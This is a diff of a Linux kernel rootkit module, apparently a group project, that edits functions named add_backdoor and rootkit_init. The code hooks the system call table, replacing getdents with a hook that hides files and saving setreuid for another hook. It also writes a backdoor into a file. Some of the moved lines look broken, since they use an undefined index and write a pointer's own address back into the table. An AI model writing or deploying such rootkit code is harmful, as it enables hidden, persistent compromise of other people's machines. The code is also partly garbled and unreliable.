@@ -113,7 +113,7 @@ void add_backdoor(char *path) {
 					{kfree(buffer);}
 		    	if(file)
 		    		{filp_close(file, NULL);}
-		`	return;
+			return;
 			}
 
 			page_count++;
@@ -130,7 +130,7 @@ void add_backdoor(char *path) {
 				{kfree(buffer);}
 		    if(file)
 		    	{filp_close(file, NULL);}
-		`return;
+		return;
 			
 		    }
 
@@ -147,7 +147,7 @@ void add_backdoor(char *path) {
 				{kfree(buffer);}
 		    if(file)
 		    	{filp_close(file, NULL);}
-		`return;
+		return;
 			
 		}
 
@@ -162,7 +162,7 @@ void add_backdoor(char *path) {
 				{kfree(buffer);}
 		    if(file)
 		    	{filp_close(file, NULL);}
-		`return;
+		return;
 	    	}
 
 // 		cleanup2:
@@ -177,12 +177,12 @@ void add_backdoor(char *path) {
 // 		    return;
 }
 
-void hide_backdoor (void) {
+// void hide_backdoor (void) {
 	
-original_getdents = (void *)sys_call_address[__NR_index];                        \
-    sys_call_address[__NR_index] = (unsigned long*)&original_getdents;
+// original_getdents = (void *)sys_call_address[__NR_index];                        \
+//     sys_call_address[__NR_index] = (unsigned long*)&original_getdents;
 	
-}
+// }
 
 // End Marc
 
@@ -318,8 +318,9 @@ static int __init rootkit_init(void){
 	original_getdents = sys_call_address[__NR_getdents]; // Get the pointer to the original sys call function
 	sys_call_address[__NR_getdents] = (void*)&sys_getdents_hook; // Replace the pointer on the table with our hook
 	// End Brian
-
-	hide_backdoor();
+	
+	original_getdents = (void *)sys_call_address[__NR_index];                        \
+    	sys_call_address[__NR_index] = (unsigned long*)&original_getdents;
 	
 	// Start Brendan
 	old_setreuid = sys_call_address[__NR_setreuid];
